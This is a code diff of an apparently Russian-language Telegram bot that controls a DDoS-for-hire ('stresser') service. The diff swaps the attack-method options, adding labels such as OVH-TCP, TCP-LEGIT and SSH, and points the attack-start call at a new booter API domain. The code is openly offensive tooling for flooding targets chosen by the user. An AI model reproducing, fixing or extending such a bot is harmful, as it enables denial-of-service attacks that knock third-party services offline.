@@ -57,14 +57,14 @@ def get_time(message):
 # Отправляем кнопки для выбора метода атаки | Send buttons to select the method of attack
 def send_method_selection(message):
     markup = types.ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
-    markup.add('DNS', 'UDP', 'Socet', 'TCP')
+    markup.add('DNS', 'OVH-TCP', 'TCP-LEGIT', 'SSH')
     bot.send_message(message.chat.id, "Выберите метод атаки:", reply_markup=markup)
     bot.register_next_step_handler(message, get_method)
 
 # Получаем метод атаки от пользователя | Getting the attack method from the user
 def get_method(message):
     method = message.text
-    if method in ['DNS', 'UDP', 'Socet', 'TCP']:
+    if method in ['DNS', 'OVH-TCP', 'TCP-LEGIT', 'SSH']:
         user_data[message.chat.id]['method'] = method
         confirm_attack(message)
     else:
@@ -81,7 +81,7 @@ def confirm_attack(message):
 # Функция для запуска атаки | Function for launching an attack
 def start_attack(message):
     data = user_data[message.chat.id]
-    url = 'https://mao-stress.tech/api/start.php'
+    url = 'https://mao-stress.de/api/start.php'
 
     headers = {
         'Accept': 'application/json'
